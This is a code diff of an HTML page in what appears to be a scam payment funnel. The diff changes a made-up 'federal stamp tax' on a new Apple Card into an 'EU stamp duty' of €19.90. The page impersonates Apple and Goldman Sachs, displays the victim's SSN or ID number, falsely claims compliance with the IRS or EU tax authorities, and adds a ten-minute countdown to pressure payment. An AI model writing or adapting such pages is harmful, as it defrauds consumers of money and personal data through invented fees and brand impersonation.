@@ -4,7 +4,7 @@
 <script src="../../tracker.js"></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Federal Stamp Tax — Apple Card</title>
+<title>EU Stamp Duty — Apple Card</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="../upsell.css">
 </head>
@@ -13,13 +13,13 @@
 <div class="loading-screen" id="loadingScreen">
   <img class="loading-logo" src="../../assets/images/black.svg" alt="">
   <div class="loading-spinner"></div>
-  <div class="loading-msg">Calculating federal stamp tax...</div>
+  <div class="loading-msg">Calculating EU stamp duty...</div>
 </div>
 
 <div class="page" id="mainPage" style="display:none">
   <nav class="nav">
     <div class="nav-spacer"></div>
-    <div class="nav-title">Federal Stamp Tax</div>
+    <div class="nav-title">EU Stamp Duty</div>
     <div class="nav-step">2/6</div>
   </nav>
 
@@ -28,8 +28,8 @@
       <div class="hero-icon">
         <svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg>
       </div>
-      <h1>Federal Stamp Tax<br>due</h1>
-      <p>New credit issuance (Apple Card from Goldman Sachs Bank USA) is subject to the federal financial transaction stamp tax.</p>
+      <h1>EU Stamp Duty<br>due</h1>
+      <p>New credit issuance (Apple Card from Goldman Sachs Bank Europe SE) is subject to the EU financial transaction stamp duty.</p>
     </div>
 
     <div class="detail-card fade-up">
@@ -38,12 +38,12 @@
         <span class="value" id="customerName">—</span>
       </div>
       <div class="dc-row">
-        <span class="label">SSN</span>
-        <span class="value" id="customerNif">—</span>
+        <span class="label">ID Number</span>
+        <span class="value" id="customerIdNumber">—</span>
       </div>
       <div class="dc-row">
         <span class="label">Tax base</span>
-        <span class="value">$4,000 (approved limit)</span>
+        <span class="value">€ 4,000 (approved limit)</span>
       </div>
       <div class="dc-row">
         <span class="label">Tax code</span>
@@ -62,7 +62,7 @@
       </div>
       <div class="reason">
         <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>
-        <div class="reason-text"><strong>Compliant with IRS</strong>Receipt issued as PDF, valid for filing on the IRS portal.</div>
+        <div class="reason-text"><strong>Compliant with EU tax authorities</strong>Receipt issued as PDF, valid for filing with your local tax authority.</div>
       </div>
       <div class="reason">
         <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7s2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z"/></svg></div>
@@ -70,14 +70,19 @@
       </div>
     </div>
 
+    <div class="urgency-banner fade-up">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm0-4h-2V7h2v8z"/></svg>
+      This price is reserved for <span class="urgency-timer" id="urgencyTimer">10:00</span>
+    </div>
+
     <div class="price-block fade-up">
       <span class="price-tag">One-time settlement</span>
-      <div class="price-value" data-price-display>$19.90</div>
-      <div class="price-desc">Federal Stamp Tax · Code 17.1 · reduced rate</div>
+      <div class="price-value" data-price-display>€ 19.90</div>
+      <div class="price-desc">EU Stamp Duty · Code 17.1 · reduced rate</div>
     </div>
 
     <button class="pay-btn" id="payBtn">
-      <span class="pay-btn-label">Settle tax · <span data-price-display>$19.90</span></span>
+      <span class="pay-btn-label">Settle tax · <span data-price-display>€ 19.90</span></span>
     </button>
 
     <div class="trust-line">
@@ -91,8 +96,8 @@
 
 <script>
 window.UPSELL_CONFIG = {
-  id: 'upsell-imposto-us',
-  title: 'Federal Stamp Tax',
+  id: 'upsell-imposto-eu',
+  title: 'EU Stamp Duty',
   price: 19.90,
   next: '../upp2-ativacao/index.html'
 };
